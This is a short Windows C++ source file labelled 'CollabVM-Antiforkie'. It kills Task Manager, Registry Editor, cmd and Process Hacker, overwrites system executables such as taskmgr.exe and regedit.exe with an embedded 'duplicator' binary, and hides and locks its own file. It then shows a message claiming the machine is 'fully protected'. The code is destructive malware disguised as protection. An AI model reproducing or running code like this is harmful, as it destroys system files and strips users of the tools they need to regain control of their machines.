#include <windows.h>
#include <fstream>
#include "kills.hpp"
#include "include/duplicator.h"

void ReplaceEXEWithAntiForkie(wchar_t *exePath, const char *exeName)
{
    killProcessByName(exeName);
    std::ofstream exeFile(exePath);

    exeFile.write(reinterpret_cast<const char *>(duplicator_exe), duplicator_exe_len);

    exeFile.close();
}

void AntiForkieCheck()
{
    killProcessByName("taskmgr.exe");
    killProcessByName("regedit.exe");
    killProcessByName("cmd.exe");
    killProcessByName("processhacker.exe");

    ReplaceEXEWithAntiForkie(L"C:\\Windows\\System32\\del.exe", "del.exe");
    ReplaceEXEWithAntiForkie(L"C:\\Windows\\System32\\rd.exe", "rd.exe");
    ReplaceEXEWithAntiForkie(L"C:\\Windows\\regedit.exe", "regedit.exe");
    ReplaceEXEWithAntiForkie(L"C:\\Windows\\System32\\taskmgr.exe", "taskmgr.exe");

    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    SetFileAttributes(szFileName, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);

    MessageBoxW(NULL, L"Hello, now this CollabVM Machine is fully protected.", L"CollabVM-Antiforkie - 0xMcraxker", MB_OK);
}